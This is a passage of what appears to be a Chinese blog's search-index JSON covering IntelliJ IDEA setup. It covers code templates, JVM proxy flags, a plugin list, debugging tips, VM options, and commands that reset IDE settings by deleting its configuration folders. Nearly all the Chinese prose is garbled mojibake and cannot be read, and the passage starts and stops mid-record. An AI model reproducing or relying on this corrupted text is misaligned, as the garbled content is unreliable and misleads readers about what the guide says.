System.out.println()xx.soutï¼šè¾“å‡ºæŒ‡å®šå˜é‡çš„å€¼ï¼š System.out.println(xx)soutmï¼šè¾“å‡ºæ–¹æ³•åï¼šSystem.out.println("Util.hexDecode");soutpï¼šè¾“å‡ºæ–¹æ³•å‚æ•°ï¼šSystem.out.println("hex = [" + hex + "]");soutvï¼šè¾“å‡ºä¸Šä¸€ä¸ªå˜é‡çš„å€¼ï¼šSystem.out.println("bytes = " + bytes); IntelliJ IDEA æ–°å¢è‡ªå®šä¹‰ä»£ç æ¨¡ç‰ˆ IntelliJ IDEA è®¾ç½®ä»£ç† IntelliJ IDEA è®¾ç½®åº”ç”¨ç¨‹åºçš„ JVM ä½¿ç”¨ä»£ç† JVM åªæ”¯æŒ Http ä»£ç†ï¼Œä¸æ”¯æŒ Socket ä»£ç† ç•Œé¢æ“ä½œè·¯å¾„ï¼šé€‰ä¸­å·¥ç¨‹ â€“&gt; Run â€“&gt; Edit Configurations â€“&gt; Application JVM é…ç½®å‚æ•°ç¤ºä¾‹ï¼š -Dhttp.proxyPort=8118 -Dhttp.proxyHost=127.0.0.1 -Dhttps.proxyPort=8118 -Dhttps.proxyHost=127.0.0.1 -Dhttp.nonProxyHosts=â€localhost|127.0.0.1|*.aliyun.comâ€ IntelliJ IDEA å¸¸ç”¨æ–­ç‚¹è°ƒè¯•æŠ€å·§ IntelliJ IDEA æ”¯æŒæ¡ä»¶æ–­ç‚¹ï¼Œå³åœ¨æ–­ç‚¹è°ƒè¯•çš„æ—¶å€™ï¼Œåœ¨å¾ªç¯é‡Œå¢åŠ æ¡ä»¶åˆ¤æ–­ï¼Œè¿™æ ·å¯ä»¥æå¤§åœ°æé«˜æ–­ç‚¹è°ƒè¯•æ•ˆç‡ã€‚å…·ä½“æ“ä½œæ–¹æ³•ï¼šåœ¨æ–­ç‚¹å¤„å³å‡»è°ƒå‡ºæ¡ä»¶æ–­ç‚¹è®¾ç½®çª—å£ï¼Œå¡«å†™æ¡ä»¶ï¼ˆå¿…é¡»æ˜¯è¿”å›å¸ƒå°”å‹çš„ç»“æœï¼‰ï¼Œç„¶ååœ¨ Debug æ¨¡å¼ä¸‹é‡æ–°å¯åŠ¨åº”ç”¨ï¼Œå°±å¯ä»¥åœ¨æ»¡è¶³æŸä¸ªæ¡ä»¶ä¸‹å®æ–½æ–­ç‚¹è°ƒè¯•ã€‚åœ¨ IntelliJ IDEA é‡Œè¿›è¡Œæ–­ç‚¹è°ƒè¯•æ—¶ï¼Œè¿˜å¯ä»¥ä½¿ç”¨æŸ¥çœ‹è¡¨è¾¾å¼çš„å€¼ï¼ˆctrl + uï¼‰æ¥è°ƒè¯•ä»£ç ã€‚ IntelliJ IDEA å¸¸ç”¨æ’ä»¶åˆ—è¡¨ æ’ä»¶åç§° æ’ä»¶è¯´æ˜ å®˜æ–¹åœ°å€ Key Promoter X å¿«æ·é”®æç¤º https://plugins.jetbrains.com/plugin/9792?pr=idea JRebel Pluginï¼ˆæ”¶è´¹ï¼‰ çƒ­éƒ¨ç½² https://plugins.jetbrains.com/plugin/4441?pr=idea CodeGlance ä»£ç ç¼–è¾‘åŒºç¼©ç•¥å›¾ https://plugins.jetbrains.com/plugin/7275?pr=idea Lombok ä»£ç æ³¨è§£æ”¯æŒ https://plugins.jetbrains.com/plugin/6317?pr=idea GsonFormat JSON è½¬é¢†åŸŸå¯¹è±¡å·¥å…· https://plugins.jetbrains.com/plugin/7654?pr=idea Alibaba Java Coding Guidelines é˜¿é‡Œå·´å·´ä»£ç è§„çº¦æ£€æµ‹ https://plugins.jetbrains.com/plugin/10046?pr=idea Mybatis Log Plugin MyBatis SQL æ—¥å¿—æ ¼å¼åŒ– https://plugins.jetbrains.com/plugin/10065?pr=idea MyBatis pluginï¼ˆæ”¶è´¹ï¼‰ MyBatis åˆ‡æ¢ Mapper æ¥å£å’Œ XML æ˜ å°„æ–‡ä»¶ https://plugins.jetbrains.com/plugin/7293?pr=idea Free MyBatis plugin MyBatis åˆ‡æ¢ Mapper æ¥å£å’Œ XML æ˜ å°„æ–‡ä»¶ https://plugins.jetbrains.com/plugin/8321?pr=idea Maven Helper Maven ä¾èµ–åˆ†æ https://plugins.jetbrains.com/plugin/7179?pr=idea Gradle Dependencies Helper Gradle ä¾èµ–æç¤º https://plugins.jetbrains.com/plugin/7299?pr=idea Gradle Dependencies Formatter å°† Maven ä¾èµ–è½¬æ¢ä¸º Gradle ä¾èµ– https://plugins.jetbrains.com/plugin/7937?pr=idea Rainbow Brackets å½©è‰²çš„æ‹¬å· https://plugins.jetbrains.com/plugin/10080?pr=idea Grep Console æ§åˆ¶æ—¥å¿—é¢œè‰² https://plugins.jetbrains.com/plugin/7125?pr=idea .ignore Git å¿½ç•¥æ–‡ä»¶ https://plugins.jetbrains.com/plugin/7495?pr=idea Translation ä¸­è‹±æ–‡ç¿»è¯‘ https://plugins.jetbrains.com/plugin/8579?pr=idea CodeMaker ä»£ç ç”Ÿæˆ https://plugins.jetbrains.com/plugin/9486?pr=idea codehelper.generator ä»£ç ç”Ÿæˆ https://plugins.jetbrains.com/plugin/8640?pr=idea MyBatisCodeHelperProï¼ˆæ”¶è´¹ï¼‰ MyBatis ä»£ç ç”Ÿæˆ https://plugins.jetbrains.com/plugin/9837?pr=idea GenerateAllSetter ç”Ÿæˆ Getã€Set æ–¹æ³• https://plugins.jetbrains.com/plugin/9360?pr=idea JUnitGenerator ç”Ÿæˆ Junit ä»£ç  https://plugins.jetbrains.com/plugin/3064?pr=idea CamelCase é©¼å³°å¼å‘½åå’Œä¸‹åˆ’çº¿å‘½åäº¤æ›¿åˆ‡æ¢ https://plugins.jetbrains.com/plugin/7160?pr=idea Statistic ä»£ç ç»Ÿè®¡ https://plugins.jetbrains.com/plugin/4509?pr=idea CheckStyle-IDEA ä»£ç è§„èŒƒå’Œé£æ ¼çš„æ£€æŸ¥ https://plugins.jetbrains.com/plugin/1065?pr=idea FindBugs-IDEA ä»£ç  Bug æ£€æŸ¥ https://plugins.jetbrains.com/plugin/3847?pr=idea SonarLint ä»£ç  Bug æ£€æŸ¥ã€ä»£ç è´¨é‡ä¼˜åŒ– https://plugins.jetbrains.com/plugin/7973?pr=idea Eclipse Code Formatter ä½¿ç”¨ Eclipse çš„ä»£ç æ ¼å¼åŒ–é£æ ¼ https://plugins.jetbrains.com/plugin/6546?pr=idea var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"IntelliJ IDEA ä¹‹äºŒå¸¸ç”¨é…ç½®ä¸ä½¿ç”¨",url:"/posts/bdfd19bb.html",text:'IntelliJ IDEA åˆ‡æ¢ä¸»é¢˜ æ›´å¤šä¸»é¢˜å¯ä»¥ä»è¿™é‡Œè·å–ï¼Œä¸»é¢˜ä¸‹è½½ä»¥åï¼Œå¯¼å…¥ä¸»é¢˜ (æ–¹å¼ä¸€) file â€“&gt; import setttings â€“&gt; é€‰ä¸­å·²ä¸‹è½½çš„ä¸»é¢˜ Jar æ–‡ä»¶ â€“&gt; ä¸€è·¯ç¡®è®¤ â€“&gt; é‡å¯ã€‚IDEA é‡å¯ä»¥åï¼Œæ–°ä¸»é¢˜ä¼šè‡ªåŠ¨å¯ç”¨ã€‚å¦å¤–ä¸€ç§æ–¹å¼æ˜¯é€šè¿‡æ’ä»¶æ¥æ›´æ¢ä¸»é¢˜ï¼Œä¾‹å¦‚å–œæ¬¢é»‘è‰²ä¸»é¢˜çš„è¯ï¼Œå¯ä»¥åœ¨çº¿å®‰è£…æ’ä»¶ â€œMaterial Themeâ€ï¼Œå®‰è£…å®Œä¹‹åé‡å¯ IDEAï¼Œæ–°çš„ä¸»é¢˜å°±ä¼šå¯ç”¨ã€‚å¦‚æœå¯¹å®‰è£…çš„ä¸»é¢˜æ’ä»¶ä¸æ»¡æ„ï¼Œè¿˜å¯ä»¥æ‰¾åˆ°æ­¤æ’ä»¶ï¼Œè¿›è¡Œå¸è½½å¹¶é‡å¯ IDEA å³å¯ã€‚é»˜è®¤ä¸»é¢˜çš„åˆ‡æ¢æ–¹å¼å¦‚ä¸‹å›¾ï¼š IntelliJ IDEA è®¾ç½®ä½¿ç”¨é¼ æ ‡æ»šè½®ä¿®æ”¹å­—ä½“å¤§å° å‹¾é€‰æ­¤è®¾ç½®åï¼Œå¯ä»¥ä½¿ç”¨ Ctrl + é¼ æ ‡æ»šè½®çš„å¿«æ·é”®æ¥æ§åˆ¶ä»£ç å­—ä½“çš„å¤§å°ã€‚ IntelliJ IDEA è®¾ç½®é¼ æ ‡æ‚¬æµ®æ˜¾ç¤ºæ–‡æ¡£æç¤º IntelliJ IDEA è®¾ç½®è‡ªåŠ¨å¯¼åŒ… â€œAdd unambiguous imports on the flyâ€ï¼Œè¡¨ç¤ºè‡ªåŠ¨å¯¼å…¥ä¸æ˜ç¡®çš„ç»“æ„ï¼Œâ€Optimize imports on the flyâ€ï¼Œè¡¨ç¤ºè‡ªåŠ¨ä¼˜åŒ–å¯¼å…¥çš„åŒ…ã€‚ IntelliJ IDEA è®¾ç½®æ˜¾ç¤ºè¡Œå· IntelliJ IDEA è®¾ç½®ä»£ç æç¤ºå¿½ç•¥å¤§å°å†™ IntelliJ IDEA çš„ä»£ç æç¤ºå’Œè¡¥å…¨åŠŸèƒ½æœ‰ä¸€ä¸ªåŒºåˆ†å¤§å°å†™çš„ç‰¹æ€§ï¼Œè€Œä¸”é»˜è®¤å°±æ˜¯ â€œFirst letter onlyâ€ åŒºåˆ†å¤§å°å†™çš„ã€‚åŒºåˆ†å¤§å°å†™çš„æƒ…å†µæ˜¯è¿™æ ·çš„ï¼Œæ¯”å¦‚åœ¨ Java ä»£ç æ–‡ä»¶ä¸­è¾“å…¥ stringBufferï¼ŒIntelliJ IDEA é»˜è®¤æ˜¯ä¸ä¼šæœ‰ä»£ç æç¤ºæˆ–è€…ä»£ç è¡¥å…¨çš„ï¼Œä½†æ˜¯å¦‚æœè¾“å…¥ StringBuffer å°±å¯ä»¥è¿›è¡Œä»£ç æç¤ºå’Œä»£ç è¡¥å…¨ã€‚ä¸ºäº†æ–¹ä¾¿å¼€å‘ï¼Œå¯ä»¥é€‰æ‹©ä¸åŒºåˆ†å¤§å°å†™ï¼Œé…ç½®æ–¹æ³•å¦‚ä¸‹å›¾ï¼š IntelliJ IDEA è®¾ç½®å–æ¶ˆå•è¡Œæ˜¾ç¤º Tab åœ¨åŒæ—¶æ‰“å¼€å¾ˆå¤šæ–‡ä»¶çš„æ—¶å€™ï¼ŒIntelliJ IDEA é»˜è®¤æ˜¯æŠŠæ‰€æœ‰æ‰“å¼€çš„ Tab è¿›è¡Œå•è¡Œæ˜¾ç¤ºçš„ã€‚ä½†æ˜¯å¤šè¡Œæ˜¾ç¤ºæ•ˆç‡æ¯”å•è¡Œæ˜¾ç¤ºé«˜ï¼Œå› ä¸ºå•è¡Œæ˜¾ç¤ºä¼šéšè—è¶…è¿‡ç•Œé¢é‚£éƒ¨åˆ†çš„ Tabï¼Œè¿™æ ·æ‰¾æ–‡ä»¶å¾ˆä¸æ–¹ä¾¿ã€‚ IntelliJ IDEA è®¾ç½®é»˜è®¤çš„å­—ä½“ã€å­—ä½“å¤§å°ã€å­—ä½“è¡Œé—´è· IntelliJ IDEA è®¾ç½®å½“å‰ä¸»é¢˜çš„å­—ä½“ã€å­—ä½“å¤§å°ã€å­—ä½“è¡Œé—´è· IntelliJ IDEA è®¾ç½®ä»£ç æ³¨é‡Šçš„å­—ä½“é¢œè‰² Doc Comment - Textï¼šä¿®æ”¹æ–‡æ¡£æ³¨é‡Šçš„å­—ä½“é¢œè‰² Block commentï¼šä¿®æ”¹å¤šè¡Œæ³¨é‡Šçš„å­—ä½“é¢œè‰² Line commentï¼šä¿®æ”¹å•è¡Œæ³¨é‡Šçš„å­—ä½“é¢œè‰² **IntelliJ IDEA è®¾ç½®è¶…è¿‡æŒ‡å®š import ä¸ªæ•°åˆ™æ”¹ä¸º import *** IntelliJ IDEA ä¿®æ”¹ç±»å¤´çš„æ–‡æ¡£æ³¨é‡Šä¿¡æ¯ å¸¸ç”¨çš„é¢„è®¾å˜é‡åˆ—è¡¨å¦‚ä¸‹ï¼š 123456789101112131415${PACKAGE_NAME} - the name of the target package where the new class or interface will be created.${PROJECT_NAME} - the name of the current project.${FILE_NAME} - the name of the PHP file that will be created.${NAME} - the name of the new file which you specify in the New File dialog box during the file creation.${USER} - the login name of the current user.${DATE} - the current system date.${TIME} - the current system time.${YEAR} - the current year.${MONTH} - the current month.${DAY} - the current day of the month.${HOUR} - the current hour.${MINUTE} - the current minute.${PRODUCT_NAME} - the name of the IDE in which the file will be created.${MONTH_NAME_SHORT} - the first 3 letters of the month name. Example: Jan, Feb, etc.${MONTH_NAME_FULL} - full name of a month. Example: January, February, etc. IntelliJ IDEA è®¾ç½®é¡¹ç›®æ–‡ä»¶ç¼–ç  â€œTransparent native-to-ascii conversionâ€ ä¸»è¦ç”¨äºè½¬æ¢ Asciiï¼Œä¸€èˆ¬éƒ½è¦å‹¾é€‰ï¼Œä¸ç„¶ Properties æ–‡ä»¶ä¸­çš„æ³¨é‡Šæ˜¾ç¤ºçš„éƒ½ä¸ä¼šæ˜¯ä¸­æ–‡ã€‚ IntelliJ IDEA è®¾ç½®è‡ªåŠ¨ç¼–è¯‘ Intellij IDEA é»˜è®¤çŠ¶æ€ä¸ºä¸è‡ªåŠ¨ç¼–è¯‘ï¼Œè€Œ Eclipse é»˜è®¤ä¸ºè‡ªåŠ¨ç¼–è¯‘ã€‚ IntelliJ IDEA å¼€å¯çœç”µæ¨¡å¼ ç•Œé¢æ“ä½œè·¯å¾„ï¼šFile â€“&gt; Power Save Modeï¼ŒIntelliJ IDEA å¼€å¯çœç”µæ¨¡å¼ä¹‹åä¼šå…³é—­ä»£ç æ£€æŸ¥å’Œä»£ç æç¤ºç­‰åŠŸèƒ½ã€‚ä¸€èˆ¬ä¹Ÿå¯è®¤ä¸ºè¿™æ˜¯ä¸€ç§é˜…è¯»æ¨¡å¼ï¼Œå¦‚æœåœ¨å¼€å‘è¿‡ç¨‹ä¸­çªç„¶é‡åˆ°ä»£ç æ–‡ä»¶ä¸èƒ½è¿›è¡Œä»£ç æ£€æŸ¥å’Œä»£ç æç¤ºï¼Œå¯ä»¥æ£€æŸ¥æ˜¯å¦å¼€å¯äº†çœç”µæ¨¡å¼ã€‚ IntelliJ IDEA è®¾ç½®æ–‡ä»¶å†…å®¹æ°´å¹³æˆ–å‚ç›´æ˜¾ç¤º IntelliJ IDEA è®¾ç½®å¿«æ·ä¸º Eclipse çš„å¿«æ·é”® IntelliJ IDEA ä¿®æ”¹å¿«æ·é”®è®¾ç½® IntelliJ IDEA é€šè¿‡å¿«æ·é”®è¿›è¡ŒåŒ¹é…ï¼ŒæŸ¥çœ‹æˆ–ä¿®æ”¹å…¶ä»–åŠŸèƒ½çš„å¿«æ·é”® IntelliJ IDEA è®¾ç½®ä¸æŠ˜å æ˜¾ç¤ºä»£ç  IntelliJ IDEA è®¾ç½®ä¸æ£€æŸ¥å•è¯æ‹¼å†™ IntelliJ IDEA å¯¼å…¥å·²æœ‰çš„å¿«æ·é”®é…ç½® å½“ IntelliJ IDEA é…ç½®å¥½æ‰€æœ‰è‡ªå·±ç†Ÿæ‚‰çš„å¿«æ·é”®ä¹‹åï¼Œå¯ä»¥å°†å¿«æ·é”®çš„é…ç½®å¯¼å‡ºä¸º Jar æ–‡ä»¶ï¼Œæ–¹ä¾¿åœ¨ä¸‹æ¬¡è¿ç§»å¼€å‘ç¯å¢ƒæ—¶æ— éœ€é‡æ–°é…ç½®ã€‚è¿™é‡Œç»™å‡ºä¸€ä»½ IntelliJ IDEA çš„å¿«æ·é”®é…ç½®æ–‡ä»¶ï¼Œç›®å‰å·²ç»å°† IntelliJ IDEA çš„å¿«æ·é”®éƒ½è®¾ç½®ä¸º Eclipse å¸¸ç”¨çš„å¿«æ·é”®ï¼Œæ–¹ä¾¿ Eclipse é‡åº¦ç”¨æˆ·å¿«é€Ÿä¸Šæ‰‹ä½¿ç”¨ IntelliJ IDEA è¿›è¡Œå¼€å‘ã€‚é…ç½®æ–‡ä»¶çš„ä¸‹è½½åœ°å€åœ¨è¿™é‡Œï¼Œå…·ä½“çš„å¿«æ·é”®è¯´æ˜å¯ä»¥æŸ¥çœ‹å›¾ç‰‡ 1ã€å›¾ç‰‡ 2ã€‚ IntelliJ IDEA å–æ¶ˆåœ¨çº¿æ£€æµ‹æ›´æ–° IntelliJ IDEA å–æ¶ˆæœªä½¿ç”¨çš„æ–¹æ³•è­¦å‘Š var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"IntelliJ IDEA ä¹‹ä¸€å¸¸ç”¨é…ç½®ä¸ä½¿ç”¨",url:"/posts/b5897f52.html",text:'IntelliJ IDEA ä»‹ç» JetBrains æ˜¯ä¸€å®¶æ·å…‹çš„è½¯ä»¶å¼€å‘å…¬å¸ï¼ŒIntelliJ IDEA æ˜¯è¯¥å…¬å¸æ——ä¸‹èµ«èµ«æœ‰åçš„ IDE äº§å“ï¼Œæ”¯æŒç›®å‰ä¸»æµçš„æŠ€æœ¯å’Œæ¡†æ¶ï¼Œæ“…é•¿ä¼ä¸šåº”ç”¨ã€ç§»åŠ¨åº”ç”¨å’Œ Web åº”ç”¨çš„å¼€å‘ã€‚IntelliJ IDEA ç›®å‰æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œåˆ†åˆ«æ˜¯ç¤¾åŒºç‰ˆï¼ˆå…è´¹ï¼‰ä¸æ——èˆ°ç‰ˆï¼ˆæ”¶è´¹ï¼‰ï¼Œç¤¾åŒºç‰ˆæ”¯æŒ JavaSEã€Androidã€Kotlinã€Groovyã€Scala å¼€å‘ï¼Œæ——èˆ°ç‰ˆé¢å¤–æ”¯æŒ JavaEE å¼€å‘ã€‚IntelliJ IDEA å’Œ Eclipse ä¸€æ ·æœ‰å¼ºå¤§çš„æ’ä»¶ç³»ç»Ÿæ”¯æŒï¼Œå®˜æ–¹çš„æ’ä»¶å¯ä»¥ä»è¿™é‡Œè·å–ã€‚ IntelliJ IDEA çš„ config ä¸ system ç›®å½• å¯åŠ¨ IntelliJ IDEA åä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå…¨æ–°çš„é»˜è®¤é…ç½®ï¼Œé…ç½®ç›®å½•çš„ä½ç½®åˆ†åˆ«æ˜¯ /.IntelliJIdea2019.1/configã€/.IntelliJIdea2019.1/systemã€‚å…¶ä¸­ config ç›®å½•æ˜¯ IntelliJ IDEA ä¸ªæ€§åŒ–çš„é…ç½®ç›®å½•ï¼Œæˆ–è€…è¯´æ˜¯æ•´ä¸ª IDE çš„è®¾ç½®ç›®å½•ï¼Œè¯¥ç›®å½•ä¸»è¦è®°å½•äº† IDE ä¸»è¦é…ç½®åŠŸèƒ½ã€æ’ä»¶åŠŸèƒ½ã€è‡ªå®šä¹‰çš„ä»£ç æ¨¡æ¿ã€è‡ªå®šä¹‰çš„æ–‡ä»¶æ¨¡æ¿ã€è‡ªå®šä¹‰çš„å¿«æ·é”®ã€Project çš„ tasks è®°å½•ç­‰ç­‰ä¸ªæ€§åŒ–è®¾ç½®ã€‚system ç›®å½•æ˜¯ IntelliJ IDEA çš„ç³»ç»Ÿæ–‡ä»¶ç›®å½•ï¼Œæ˜¯ IntelliJ IDEA ä¸å¼€å‘é¡¹ç›®çš„ä¸€ä¸ªæ¡¥æ¢ï¼Œé‡Œé¢ä¸»è¦æœ‰ç¼“å­˜ã€ç´¢å¼•ã€å®¹å™¨æ–‡ä»¶è¾“å‡ºç­‰ç­‰ï¼Œè™½ç„¶ä¸æ˜¯æœ€é‡è¦ç›®å½•ï¼Œä½†ä¹Ÿæ˜¯æœ€ä¸å¯æˆ–ç¼ºçš„ç›®å½•ä¹‹ä¸€ã€‚ 12345# Linuxä¸‹é‡ç½®IDEAçš„æ‰€æœ‰é…ç½®$ rm -rf ~/.config/JetBrains$ rm -rf ~/.local/share/JetBrains$ rm -rf ~/.IntelliJIdea2019.1/config$ rm -rf ~/.IntelliJIdea2019.1/system IntelliJ IDEA ä¸­ Project ä¸ Module çš„æ¦‚å¿µ åœ¨ Eclipse ä¸­æœ‰ Workspaceï¼ˆå·¥ä½œç©ºé—´ï¼‰å’Œ Projectï¼ˆå·¥ç¨‹ï¼‰çš„æ¦‚å¿µï¼Œåœ¨ IntelliJ IDEA ä¸­åªæœ‰ Projectï¼ˆå·¥ç¨‹ï¼‰å’Œ Moduleï¼ˆæ¨¡å—ï¼‰çš„æ¦‚å¿µï¼ŒIntelliJ IDEA ä¸­ Project æ˜¯æœ€é¡¶çº§çš„çº§åˆ«ï¼Œæ¬¡çº§åˆ«æ˜¯ Moduleã€‚è¿™é‡Œçš„å¯¹åº”å…³ç³»ä¸ºï¼ŒEclipse ä¸­ Workspace ç›¸å½“äº IDEA ä¸­çš„ Projectï¼ŒEclipse ä¸­ Project ç›¸å½“äº IDEA ä¸­çš„ Moduleã€‚Eclipse å¯ä»¥åœ¨åŒä¸€ä¸ªçª—å£ç®¡ç† N ä¸ªé¡¹ç›®ï¼Œè¿™åœ¨ IntelliJ IDEA æ˜¯æ— æ³•åšåˆ°çš„ã€‚IntelliJ IDEA æä¾›çš„è§£å†³æ–¹æ¡ˆæ˜¯æ‰“å¼€å¤šä¸ªé¡¹ç›®å®ä¾‹ï¼Œå³æ‰“å¼€å¤šä¸ªé¡¹ç›®çª—å£ï¼Œå³ä¸€ä¸ª Project æ‰“å¼€ä¸€ä¸ª Window çª—å£ã€‚ IntelliJ IDEA å¯¹ç‰ˆæœ¬æ§åˆ¶å·¥å…·çš„æ”¯æŒ å¾ˆå¤šäººè®¤ä¸º IntelliJ IDEA è‡ªå¸¦äº† SVN æˆ–è€… Git ç­‰ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œè®¤ä¸ºåªè¦å®‰è£…äº† IntelliJ IDEA å°±å¯ä»¥å®Œå…¨ä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶åº”æœ‰çš„åŠŸèƒ½ã€‚è¿™å®Œå…¨æ˜¯ä¸€ç§é”™è¯¯çš„è§£è¯»ï¼ŒIntelliJ IDEA æ˜¯è‡ªå¸¦å¯¹è¿™äº›ç‰ˆæœ¬æ§åˆ¶å·¥å…·çš„æ’ä»¶æ”¯æŒï¼Œä½†æ˜¯è¯¥è£…ä»€ä¹ˆç‰ˆæœ¬æ§åˆ¶å®¢æˆ·ç«¯è¿˜æ˜¯è¦ç…§æ ·è£…çš„ï¼Œè¿™ä¸€ç‚¹å’Œ Eclipse æ˜¯ä¸€æ ·çš„ã€‚åœ¨ Window ç¯å¢ƒä¸‹ï¼Œç»å¸¸ä½¿ç”¨çš„ Git å®¢æˆ·ç«¯æœ‰ msysGitã€TortoiseGit ç­‰ã€‚IntelliJ IDEA å¯¹ç‰ˆæœ¬æ§åˆ¶çš„æ”¯æŒæ˜¯ä»¥æ’ä»¶åŒ–çš„æ–¹å¼æ¥å®ç°çš„ï¼Œæ——èˆ°ç‰ˆé»˜è®¤æ”¯æŒç›®å‰ä¸»æµçš„ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ï¼Œä¾‹å¦‚ CVSã€Gitã€Subversion (SVN)ã€Mercurialã€Perforceã€GitHubã€‚ IntelliJ IDEA æ”¯æŒæœ¬åœ°æ–‡ä»¶å†å²çš„è®°å½• å½“é¡¹ç›®ä¸­æ²¡æœ‰ä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶åŠŸèƒ½ï¼ŒIntelliJ IDEA ä¹Ÿé»˜è®¤æä¾›äº†æœ¬åœ°æ–‡ä»¶å†å²è®°å½•ã€‚ç•Œé¢æ“ä½œè·¯å¾„ï¼šé€‰ä¸­æ–‡ä»¶ â€“&gt; Local History â€“&gt; Show History IntelliJ IDEA è°ƒæ•´ VM é…ç½®æ–‡ä»¶ æ ¹æ®ç”µè„‘ç³»ç»Ÿçš„ä½æ•°ï¼Œé€‰æ‹©ä¿®æ”¹ 32 ä½çš„ VM é…ç½®æ–‡ä»¶ï¼ˆidea.vmoptionsï¼‰æˆ–è€… 64 ä½çš„ VM é…ç½®æ–‡ä»¶ï¼ˆidea64.vmoptionsï¼‰ 32 ä½æ“ä½œç³»ç»Ÿå†…å­˜ä¸ä¼šè¶…è¿‡ 4Gï¼Œå› æ­¤æ²¡æœ‰å¤šå¤§ç©ºé—´å¯ä»¥è°ƒæ•´ï¼Œå»ºè®®ä¸ç”¨è°ƒæ•´ 64 ä½æ“ä½œç³»ç»Ÿä¸­ 8G å†…å­˜ä»¥ä¸‹çš„æœºå­æˆ–è€…æ˜¯é™æ€é¡µé¢çš„å¼€å‘è€…ï¼Œå»ºè®®ä¸ç”¨è°ƒæ•´ 64 ä½æ“ä½œç³»ç»Ÿä¸”å†…å­˜å¤§äº 8G çš„ï¼Œå¦‚æœæ˜¯å¼€å‘å¤§å‹é¡¹ç›®ã€Java é¡¹ç›®æˆ–è€…æ˜¯ Android é¡¹ç›®ï¼Œå»ºè®®è¿›è¡Œä¿®æ”¹ï¼Œç»å¸¸ä¿®æ”¹çš„å°±æ˜¯ä¸‹é¢ä¸‰ä¸ªå‚æ•° å¦‚æœæ­£åœ¨ä½¿ç”¨ Eclipse / MyEclipseï¼Œæƒ³é€šè¿‡ IntelliJ IDEA æ¥è§£å†³è®¡ç®—æœºçš„å¡ã€æ…¢ç­‰é—®é¢˜ï¼Œè¿™åŸºæœ¬ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œäº‹å®ä¸Š IntelliJ IDEA æ›´å ç”¨ç³»ç»Ÿèµ„æº 1234567891011# é»˜è®¤é…ç½®çš„å†…å®¹å¦‚ä¸‹ï¼Œé…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼š$idea-root/bin/-Xms128m-Xmx512m-XX:ReservedCodeCacheSize=240m-XX:+UseConcMarkSweepGC-XX:SoftRefLRUPolicyMSPerMB=50# é…ç½®è°ƒæ•´çš„å»ºè®®-Xms128mï¼Œ16Gå†…å­˜çš„æœºå™¨å¯å°è¯•è®¾ç½®ä¸º -Xms512mï¼Œç”¨äºè®¾ç½®åˆå§‹çš„å†…å­˜æ•°ï¼Œæé«˜è¯¥å€¼å¯ä»¥æé«˜Javaç¨‹åºçš„å¯åŠ¨é€Ÿåº¦-Xmx750mï¼Œ16Gå†…å­˜çš„æœºå™¨å¯å°è¯•è®¾ç½®ä¸º -Xmx2048mï¼Œç”¨äºè®¾ç½®æœ€å¤§å†…å­˜æ•°ï¼Œæé«˜è¯¥å€¼å¯ä»¥å‡å°‘GCæ‰§è¡Œçš„é¢‘ç‡ï¼Œæé«˜ç¨‹åºæ€§èƒ½-XX:ReservedCodeCacheSize=240mï¼Œ16Gå†…å­˜çš„æœºå™¨å¯å°è¯•è®¾ç½®ä¸º -XX:ReservedCodeCacheSize=1024mï¼Œç”¨äºä¿ç•™ä»£ç å ç”¨çš„å†…å­˜å®¹é‡ IntelliJ IDEA ç¼“å­˜å’Œç´¢å¼•çš„æ¸…ç† IntelliJ IDEA é¦–æ¬¡åŠ è½½é¡¹ç›®çš„æ—¶å€™ï¼Œéƒ½ä¼šåˆ›å»ºç´¢å¼•ï¼Œè€Œåˆ›å»ºç´¢å¼•çš„æ—¶é—´è·Ÿé¡¹ç›®çš„æ–‡ä»¶å¤šå°‘æˆæ­£æ¯”ã€‚åœ¨ IntelliJ IDEA åˆ›å»ºç´¢å¼•è¿‡ç¨‹ä¸­å³ä½¿ç¼–è¾‘äº†ä»£ç ä¹Ÿæ˜¯ç¼–è¯‘ä¸äº†ã€è¿è¡Œä¸èµ·æ¥çš„ï¼Œåªèƒ½ç­‰ IntelliJ IDEA åˆ›å»ºç´¢å¼•å®Œæˆã€‚IntelliJ IDEA çš„ç¼“å­˜å’Œç´¢å¼•ä¸»è¦æ˜¯ç”¨æ¥åŠ å¿«æ–‡ä»¶æŸ¥è¯¢ï¼Œä»è€ŒåŠ å¿«å„ç§æŸ¥æ‰¾ã€ä»£ç æç¤ºç­‰æ“ä½œçš„é€Ÿåº¦ã€‚ä½†æ˜¯åœ¨æŸäº›ç‰¹æ®Šæ¡ä»¶ä¸‹ï¼ŒIntelliJ IDEA 